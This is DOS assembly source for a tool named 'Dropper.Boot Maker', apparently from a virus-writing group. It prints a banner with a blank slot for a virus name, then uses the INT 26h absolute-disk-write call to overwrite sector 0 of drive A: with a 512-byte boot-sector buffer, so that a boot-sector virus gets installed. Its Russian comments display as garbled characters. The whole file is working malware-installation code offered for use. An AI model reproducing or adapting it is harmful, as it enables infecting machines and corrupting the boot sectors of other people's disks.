   ; Dropper.Boot Maker v0.1 by Duke/SMF


           model tiny
           .code
           org 100h

   start:
           mov ah,9                   ; ¢ë¢®¤¨¬ § £®«®¢®ª ¨ ¨¬ï ¢¨àãá 
           mov dx,offset DPMs
           int 21h

           call  setboot              ; ¢ë§®¢ ãáâ ®¢ª¨ boot-á¥ªâ®à 

           mov ah,9                   ; á®®¡é ¥¬ ® § ¢¥àè¥¨¨
           mov dx, offset DPMe
           int 21h
           ret
   ;----------------------------------
   ; “áâ ®¢ª  boot-á¥ªâ®à :
   setboot:

   disk    equ 0                      ; ª ª®© ¤¨áª (0=a:, 1=b:)
   sec     equ 0                      ; ª ª®© á¥ªâ®à
   nsec    equ 1                      ; ª®«¨ç¥áâ¢® á¥ªâ®à®¢
   op      equ 1                      ; ®¯¥à æ¨ï   á¥ªâ®à®¬ (1=§ ¯¨áì)

           mov    DX, Word Ptr Sec    ; DX := Sec
           mov    CX, NSec            ; CX := NSec
           push   DS                  ; ‘®åà ï¥¬ DS - ® ¡ã¤¥â ¨á¯®àç¥
           push   BP                  ; ‘®åà ï¥¬ BP

           mov    bx,offset boot
           mov    AL,Op               ; AL := Op
           shr    AX,1                ; *¥à¥®á¨¬ ¬« ¤è¨© ¡¨â Op ¢ CF
           mov    AL,Disk             ; AL := Disk
           int    26H                 ; ‡ ¯¨áë¢ ¥¬ ¤ ë¥

           pop    DX                  ; ˆ§¢«¥ª ¥¬ ä« £¨ ¨§ áâ¥ª 
           pop    BP                  ; ‚®ááâ  ¢«¨¢ ¥¬ BP
           pop    DS                  ; ‚®ááâ  ¢«¨¢ ¥¬ DS

           ; íâ® ¤«ï â¥å, ªâ® § å®ç¥â ãá®¢¥àè¥áâ¢®¢ âì
           mov    BX,1                ; BX := True
           jc     Exit                ; *¥à¥©â¨, ¥á«¨ ¡ë«  ®è¨¡ª 
           mov    BX,0                ; BX := False
           xor    AX,AX               ; Ž¡ã«ï¥¬ ª®¤ ®è¨¡ª¨
   exit:
           ret
   ;----------------------------------
   DPMs:   db 'Dropper.Boot for '
           db 20 dup (' ')            ; ¬¥áâ¥çª® ®áâ ¢«¥® ¯®¤ ¨¬ï ¢¨àãá 
           db 13,10,'$'
   DPMe:   db 'Installation complete!',13,10,'$'
   boot:   db 512 dup (?)

   end start
